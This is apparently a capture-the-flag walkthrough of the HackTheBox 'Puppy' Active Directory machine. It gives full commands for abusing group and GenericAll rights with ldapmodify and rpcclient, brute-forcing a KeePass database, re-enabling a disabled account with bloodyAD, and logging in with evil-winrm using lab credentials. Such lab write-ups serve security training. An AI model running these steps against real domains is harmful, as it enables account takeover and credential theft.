### Bloodhound Enumeration

![image.png](image.webp)

I import the results into BloodHound, locate `levi`, mark the account as owned, and inspect its paths.

Apparently this will just leave me confused. So what I'll do is narrow down my search to know what my approach would be.

I open Levi's **Node Info** and examine group memberships, local administrator rights, execution rights, and outbound object control.

**GROUP MEMBERSHIPS:** I check which groups contain `levi.james` and what access they grant.

**LOCAL ADMIN RIGHTS:** I look for `AdminTo` edges identifying local administrator access to computers.

**EXECUTION RIGHTS:** I inspect execution and delegation relationships involving other computers.

**OUTBOUND OBJECT CONTROL:** I look for edges such as `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, and `ForceChangePassword`.

### Shares

Upon my enumeration, I can see that `levi.james` can add himself as a member for `DEVELOPERS@PUPPY.HTB` , through `HR@PUPPY.HTB` since levi is a member of HR group.

### User Foothold

I'll add levi to the developer group. I make an ldif file `modify.ldif`

```bash
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
```

I use `ldapmodify` tool

```bash
ldapmodify -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify.ldif
```

Now that levi is added, I'll explore the `DEV` share

```bash
smbclient //10.10.11.70/DEV -U "levi.james%KingofAkron2025!"
```

Then I'll get `recovery.kdbx`

```bash
get recovery.kdbx
```

For me to crack this, I need a tool from the public `John The Ripper` tool does not support this method yet. I'll install `keepassxs` also to open what’s inside.

```bash
sudo apt install keepassxc

git clone https://github.com/r3nt0n/keepass4brute

./keepass4brute/keepass4brute.sh recovery.kdbx rockyou.txt
# This will give the password 'liverpool'

keepassxc-cli export --format=xml recovery.kdbx > keepass_dump.xml
```

I inspect `keepass_dump.xml` and find the following credentials:


These passwords are associated by the existing users that I found earlier already. But I can also verify this with `nxc` or `crackmapexec` to see if any of these users are active.


I'll find a user `ant.edwards:Antman2025!` I'll do another bloodhound enumeration with this user.

```bash
bloodhound-python -dc DC.PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' -d PUPPY.HTB -c All --zip --dns-timeout 30 -ns 10.10.11.70
```

![image.png](image%202.webp)

I find out that `ANT.EDWARDS@PUPPY.HTB` can force change password for the user `ADAM.SILVER@PUPPY.HTB` because of the `GenericAll` privilege.

```bash
rpcclient -U 'puppy.htb\Ant.Edwards%Antman2025!' 10.10.11.70
rpcclient $> setuserinfo ADAM.SILVER 23 Password@123!
```

I'll check if this account is enabled

```bash
nxc smb 10.10.11.70 -u 'ADAM.SILVER' -p 'Password@123!'
<SNIP>
PUPPY.HTB\ADAM.SILVER:Password@987 STATUS_ACCOUNT_DISABLED
```

Since the account is disabled, I'll enable this using `bloodyAD` tool

```bash
bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p Antman2025! remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
```

I do an `evil-winrm` to the user with the account `ADAM.SILVER`

```bash
evil-winrm -i 10.10.11.70 -u adam.silver -p Password@123!
```

Then I get the flag that’s sitting in Desktop directory.
